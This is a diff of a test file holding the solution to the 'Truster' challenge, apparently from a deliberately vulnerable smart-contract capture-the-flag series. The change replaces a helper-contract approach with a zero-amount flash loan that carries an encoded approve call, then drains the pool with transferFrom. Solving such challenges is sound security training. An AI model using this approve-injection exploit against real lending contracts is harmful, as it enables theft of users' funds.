@@ -33,18 +33,6 @@ describe("[Challenge] Truster", function () {
 
 	it("Exploit", async function () {
 		/** CODE YOUR EXPLOIT HERE  */
-
-		const EvilContractFactory = await ethers.getContractFactory(
-			"EvilContract",
-			attacker
-		);
-		this.evil = await EvilContractFactory.deploy(
-			this.pool.address,
-			this.token.address
-		);
-
-		// console.log(this.evil);
-
 		let ABI = ["function approve(address spender, uint256 amount)"];
 		let iface = new ethers.utils.Interface(ABI);
 		const payload = iface.encodeFunctionData("approve", [
@@ -53,17 +41,14 @@ describe("[Challenge] Truster", function () {
 		]);
 		await this.pool
 			.connect(attacker)
-			.flashLoan(
-				ethers.utils.parseEther("1"),
-				this.evil.address,
-				this.token.address,
-				payload
-			);
-		await attacker.transferFrom(
+			.flashLoan(0, attacker.address, this.token.address, payload);
+		const allowance = await this.token.allowance(
 			this.pool.address,
-			attacker.address,
-			TOKENS_IN_POOL
+			attacker.address
 		);
+		await this.token
+			.connect(attacker)
+			.transferFrom(this.pool.address, attacker.address, allowance);
 	});
 
 	after(async function () {
